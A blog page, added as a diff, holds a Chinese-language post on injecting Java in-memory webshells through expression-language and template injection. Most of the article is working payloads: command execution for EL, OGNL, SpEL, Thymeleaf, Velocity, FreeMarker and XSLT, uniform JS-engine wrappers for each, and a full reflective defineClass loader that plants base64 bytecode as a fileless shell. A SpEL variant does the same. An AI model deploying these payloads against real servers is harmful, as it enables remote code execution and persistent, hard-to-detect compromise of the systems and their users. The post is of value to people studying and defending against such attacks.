@@ -1,0 +1,771 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#265689e3">
+  <meta name="author" content="Pho3n1x">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="解析语言内存马注入(一)前言在一直以来的漏洞挖掘和攻防过程中，我们会发现经常会出现表达式语言注入漏洞，而为了稳定获取权限就不可避免的需要注入内存马 解析语言概述本文会测试使用的表达式语言基本都是常见的java表达式语言或常见模板，一共6种，如下所示： 123456ELOGNLSPELThymeleafVelocityFreeMarker  解析语言介绍EL表达式EL表达式全名Expression">
+<meta property="og:type" content="article">
+<meta property="og:title" content="解析语言内存马注入(一)">
+<meta property="og:url" content="https://pho3n1x-web.github.io/2024/03/01/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5(%E4%B8%80)/index.html">
+<meta property="og:site_name" content="Pho3n1x&#39;s Blog">
+<meta property="og:description" content="解析语言内存马注入(一)前言在一直以来的漏洞挖掘和攻防过程中，我们会发现经常会出现表达式语言注入漏洞，而为了稳定获取权限就不可避免的需要注入内存马 解析语言概述本文会测试使用的表达式语言基本都是常见的java表达式语言或常见模板，一共6种，如下所示： 123456ELOGNLSPELThymeleafVelocityFreeMarker  解析语言介绍EL表达式EL表达式全名Expression">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-01T03:32:23.055Z">
+<meta property="article:modified_time" content="2024-03-01T03:34:23.342Z">
+<meta property="article:author" content="Pho3n1x">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>解析语言内存马注入(一) - Pho3n1x&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pho3n1x-web.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"b8740508fd1301a3ac1041c71ac2d36a","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?b8740508fd1301a3ac1041c71ac2d36a";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pho3n1x</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1322308.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="解析语言内存马注入(一)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-01 11:32" pubdate>
+          March 1, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">解析语言内存马注入(一)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="解析语言内存马注入-一"><a href="#解析语言内存马注入-一" class="headerlink" title="解析语言内存马注入(一)"></a>解析语言内存马注入(一)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在一直以来的漏洞挖掘和攻防过程中，我们会发现经常会出现表达式语言注入漏洞，而为了稳定获取权限就不可避免的需要注入内存马</p>
+<h1 id="解析语言概述"><a href="#解析语言概述" class="headerlink" title="解析语言概述"></a>解析语言概述</h1><p>本文会测试使用的表达式语言基本都是常见的java表达式语言或常见模板，一共6种，如下所示：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">EL</span><br><span class="hljs-attribute">OGNL</span><br><span class="hljs-attribute">SPEL</span><br><span class="hljs-attribute">Thymeleaf</span><br><span class="hljs-attribute">Velocity</span><br><span class="hljs-attribute">FreeMarker</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="解析语言介绍"><a href="#解析语言介绍" class="headerlink" title="解析语言介绍"></a>解析语言介绍</h2><h3 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h3><p>EL表达式全名Expression Language，主要用于替换JSP页面中的脚本表达式，主要作用有获取数据、执行运算、获取web开发对象、调用Java方法</p>
+<p>常见的命令执行的payload有：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>)<span class="hljs-selector-class">.getMethod</span>(<span class="hljs-string">&#x27;getRuntime&#x27;</span>)<span class="hljs-selector-class">.invoke</span>(null)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h3><p>OGNL是Object Graphic Navigation Language(对象图导航语言)的缩写，一个开源项目。Struts框架使用OGNL作为默认的表达式语言</p>
+<p>常见的命令执行的payload有：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">(<span class="hljs-keyword">new</span> javax.script.<span class="hljs-constructor">ScriptEngineManager()</span>).get<span class="hljs-constructor">EngineByName(&#x27;<span class="hljs-params">js</span>&#x27;)</span>.eval(&#x27;java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)&#x27;)<br></code></pre></td></tr></table></figure>
+
+<h3 id="SPEL表达式"><a href="#SPEL表达式" class="headerlink" title="SPEL表达式"></a>SPEL表达式</h3><p>Spring表达式语言（SpEL）是Spring框架的一部分，自Spring 3.0版本开始引入。SpEL的设计目标是提供一种通用的表达式语言，用于在Spring框架中进行各种配置和运行时处理。它被广泛用于Spring框架内的注解、XML配置、Spring Security等模块，为开发者提供了强大而灵活的表达式解析和求值能力</p>
+<p>常见的命令执行的payload有：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Thymeleaf模板"><a href="#Thymeleaf模板" class="headerlink" title="Thymeleaf模板"></a>Thymeleaf模板</h3><p> Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与python web开发中的jinja模板引擎</p>
+<p>常见的命令执行的payload有：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22calc</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__::</span>.x<br></code></pre></td></tr></table></figure>
+
+<h3 id="Velocity模板"><a href="#Velocity模板" class="headerlink" title="Velocity模板"></a>Velocity模板</h3><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象</p>
+<p>常见的命令执行的payload有：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-variable">$x</span><span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="FreeMarker模板"><a href="#FreeMarker模板" class="headerlink" title="FreeMarker模板"></a>FreeMarker模板</h3><p>FreeMarker是一个基于Java的模板引擎，一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具</p>
+<p>常见的命令执行的payload有：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h1><h2 id="探寻通用的内存马注入方式"><a href="#探寻通用的内存马注入方式" class="headerlink" title="探寻通用的内存马注入方式"></a>探寻通用的内存马注入方式</h2><p>如此之多的表达式注入、模板注入，每一个的语法，结构都大相径庭，因此，在正是注入内存马之前，我需要一个可以统合各种语法的注入方式，在一番思索后，有两个很好的选择：<code>JsEngine</code>、<code>Spel</code>,通过调用解析引擎可以做到部分内容具有可移植性，已经是最好最方便的结果了</p>
+<h3 id="JsEngine调用"><a href="#JsEngine调用" class="headerlink" title="JsEngine调用"></a>JsEngine调用</h3><p>就像2023年KCon中《Java表达式攻防下的黑魔法》一文中写到，Java有很多种表达式，不同表达式有不同的语法特点：有些必须要 用链式反射去调用方法，有些可以直接new；有些表达式只能执行一 句，有些可以执行多句</p>
+<p>想要做到武器化利用就要选取一种通用的中间层语言，去延展我们的 利用链</p>
+<p>其中JS引擎就非常符合我们的要求： </p>
+<ol>
+<li>一行代码即可调用JS引擎，在JS引擎中可以执行多句 </li>
+<li>JDK6-14都可以使用，基本满足对兼容性的需要 </li>
+<li>可以间接调用Java方法，实现任意代码执行</li>
+</ol>
+<p>因此，通过JS引擎可以扩展表达式的执行能力，甚至可以统一多种表达式的格式问题</p>
+<p><strong>EL表达式</strong></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-string">&quot;&quot;</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(&#x27;<span class="hljs-params">js</span>&#x27;)</span>.eval(&#x27;<span class="hljs-comment">/*js代码内容*/</span>&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><strong>OGNL表达式</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(new javax<span class="hljs-selector-class">.script</span><span class="hljs-selector-class">.ScriptEngineManager</span>())<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&#x27;js&#x27;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>SPEL表达式</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#&#123;new javax<span class="hljs-selector-class">.script</span><span class="hljs-selector-class">.ScriptEngineManager</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&#x27;js&#x27;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>Thymeleaf模板</strong></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">__$%<span class="hljs-number">7</span>bnew%20java.util.Scanner(T(javax.script.ScriptEngineManager).getEngineByName(<span class="hljs-string">&#x27;js&#x27;</span>).<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)).next()%7d__::.x<br></code></pre></td></tr></table></figure>
+
+<p><strong>Velocity模板</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-variable">$x</span><span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;javax.script.ScriptEngineManager&#x27;</span>)<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&#x27;js&#x27;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&#x27;/*js代码内容*/&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>FreeMarker模板</strong></p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;/*js代码内容*/&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>XSLT注入</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;?xml <span class="hljs-keyword">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;xs<span class="hljs-variable">l:stylesheetversion</span>=<span class="hljs-string">&quot;1.0&quot;</span><br>xmln<span class="hljs-variable">s:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br>xmln<span class="hljs-variable">s:rt</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span><br>xmln<span class="hljs-variable">s:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;<br>&lt;xs<span class="hljs-variable">l:templatematch</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;<br>&lt;xs<span class="hljs-variable">l:variablename</span>=<span class="hljs-string">&quot;rtobject&quot;</span> select=<span class="hljs-string">&quot;rt:getRuntime()&quot;</span>/&gt;<br>&lt;xs<span class="hljs-variable">l:variablename</span>=<span class="hljs-string">&quot;process&quot;</span> select=<span class="hljs-string">&quot;rt:exec($rtobject,&#x27;calc&#x27;)&quot;</span>/&gt;<br>&lt;xs<span class="hljs-variable">l:variablename</span>=<span class="hljs-string">&quot;processString&quot;</span> select=<span class="hljs-string">&quot;ob:toString($process)&quot;</span>/&gt;<br>&lt;xs<span class="hljs-variable">l:value</span>-ofselect=<span class="hljs-string">&quot;$processString&quot;</span>/&gt;<br>&lt;/xs<span class="hljs-variable">l:template</span>&gt;<br>&lt;/xs<span class="hljs-variable">l:stylesheet</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="JsEngine注入内存马"><a href="#JsEngine注入内存马" class="headerlink" title="JsEngine注入内存马"></a>JsEngine注入内存马</h3><p>为了能够更加自由的实现加载字节码，于是这里需要引入<code>defineclass</code>,其通用性强和无需落地文件的特性使得许多人都推崇备至，虽然后续高版本Java会有些限制，但是无伤大雅，在这里不进行过多讨论，而且在某些层面，其实具备一些免杀效果，通过对上下文classloader获取的defineclass加载的filter为白名单</p>
+<p>先通过深搜获取线程的<code>classloader</code>，再利用js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的，再利用classLoader获取到defineclass方法，利用definecalss加载字节码（下面是基础的注入，并未使用高版本绕过）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> classLoader = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">getContextClassLoader</span>();<span class="hljs-keyword">try</span>&#123;classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;/*注入器名称*/&#x27;</span>).<span class="hljs-title function_">newInstance</span>();&#125;<span class="hljs-keyword">catch</span> (e)&#123;<span class="hljs-keyword">var</span> clsString = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<span class="hljs-keyword">var</span> bytecodeBase64 = <span class="hljs-string">&#x27;/*内存马注入字节码*/&#x27;</span>;<span class="hljs-keyword">var</span> bytecode;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">var</span> clsBase64 = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.util.Base64&#x27;</span>);<span class="hljs-keyword">var</span> clsDecoder = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.util.Base64$Decoder&#x27;</span>);<span class="hljs-keyword">var</span> decoder = clsBase64.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;getDecoder&#x27;</span>).<span class="hljs-title function_">invoke</span>(base64Clz);bytecode = clsDecoder.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;decode&#x27;</span>, clsString).<span class="hljs-title function_">invoke</span>(decoder, bytecodeBase64);&#125; <span class="hljs-keyword">catch</span> (ee) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">var</span> datatypeConverterClz = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;javax.xml.bind.DatatypeConverter&#x27;</span>);bytecode = datatypeConverterClz.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;parseBase64Binary&#x27;</span>, clsString).<span class="hljs-title function_">invoke</span>(datatypeConverterClz, bytecodeBase64);&#125; <span class="hljs-keyword">catch</span> (eee) &#123;<span class="hljs-keyword">var</span> clazz1 = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;sun.misc.BASE64Decoder&#x27;</span>);bytecode = clazz1.<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">decodeBuffer</span>(bytecodeBase64);&#125;&#125;<span class="hljs-keyword">var</span> clsClassLoader = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span>);<span class="hljs-keyword">var</span> clsByteArray = (<span class="hljs-keyword">new</span> java.<span class="hljs-property">lang</span>.<span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;a&#x27;</span>).<span class="hljs-title function_">getBytes</span>().<span class="hljs-title function_">getClass</span>());<span class="hljs-keyword">var</span> clsInt = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Integer</span>.<span class="hljs-property">TYPE</span>;<span class="hljs-keyword">var</span> defineClass = clsClassLoader.<span class="hljs-title function_">getDeclaredMethod</span>(<span class="hljs-string">&#x27;defineClass&#x27;</span>, [clsByteArray, clsInt, clsInt]);defineClass.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<span class="hljs-keyword">var</span> clazz = defineClass.<span class="hljs-title function_">invoke</span>(classLoader,bytecode,<span class="hljs-keyword">new</span> java.<span class="hljs-property">lang</span>.<span class="hljs-title class_">Integer</span>(<span class="hljs-number">0</span>),<span class="hljs-keyword">new</span> java.<span class="hljs-property">lang</span>.<span class="hljs-title class_">Integer</span>(bytecode.<span class="hljs-property">length</span>));clazz.<span class="hljs-title function_">newInstance</span>();&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来就把这里的内容放到上面的内容里就行，注意双引号和引号的转义，注意注入器名称即可</p>
+<h3 id="Spel调用"><a href="#Spel调用" class="headerlink" title="Spel调用"></a>Spel调用</h3><p><code>Spel</code>是Spring框架的一部分，所以在某些时候会同样适合去作为统一的字节码加载模板</p>
+<p>同样通过调用defineclass去加载字节码，不过是通过<code>ReflectUtils</code>反射调用defineclass去加载字节码，spel的代码会短一些</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#&#123;<span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">cglib</span>.<span class="hljs-params">core</span>.ReflectUtils)</span>.define<span class="hljs-constructor">Class(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">*</span>注入器名称<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;,T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.Base64Utils)</span>.decode<span class="hljs-constructor">FromString(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">*</span>字节码<span class="hljs-params">base64</span>内容<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;)</span>,<span class="hljs-keyword">new</span> javax.management.loading.<span class="hljs-constructor">MLet(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">net</span>.URL[0],T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Thread)</span>.current<span class="hljs-constructor">Thread()</span>.get<span class="hljs-constructor">ContextClassLoader()</span>)).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来就把这里的内容放到上面的内容里就行，注意双引号和引号的转义，注意注入器名称即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="category-chain-item">学习记录</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>解析语言内存马注入(一)</div>
+      <div>https://pho3n1x-web.github.io/2024/03/01/表达式语言内存马注入(一)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Pho3n1x</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 1, 2024</div>
+        </div>
+      
+      
